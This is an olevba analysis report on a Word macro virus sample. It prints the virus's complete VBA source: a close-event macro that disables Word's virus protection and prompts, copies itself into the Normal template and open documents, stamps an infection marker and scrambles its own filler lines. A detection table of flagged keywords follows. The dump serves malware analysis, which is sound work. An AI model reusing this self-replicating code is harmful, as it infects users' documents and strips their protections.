olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fh-20d7f08bd6777baa4788f784c61e079883e8f42e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fh-20d7f08bd6777baa4788f784c61e079883e8f42e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
UJ26 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UIL = QBN + KGN
Options.ConfirmConversions = 0
OFG = SSM + VUE
Options.SaveNormalPrompt = 0
PVF = LCV + OAM
Application.EnableCancelKey = 0
CCR = GBG + IGU
Options.VirusProtection = 0
VIG = DDO + JJP
OA92 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set SJ28 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
CV10 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set SJ28 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr
OLS = BEO + JHD
OA92 = OA92 + 2
PUL = BQI + KKE
MD21 = True
HCM = DUC + JGT
End If
QGO = FBA + HRG
If MD21 <> True And CV10 <> True Then GoTo UJ71
FKF = HAK + ETM
If MD21 = True Then SJ28.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, OA92 - 1))
QUH = LBN + JVC
If CV10 = True Then SJ28.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UJ26 - 1))
UNH = DKE + VCA
With SJ28.CodeModule
HMU = LIS + SOP
For x = 2 To (SJ28.CodeModule.CountOfLines - 1) Step 2
VHK = JPD + JLR
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
LJL = FNK + OTI
Next x
GGD = LEM + HTK
End With
EPQ = NRD + REV
UJ71:
BBR = IKC + CDB
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
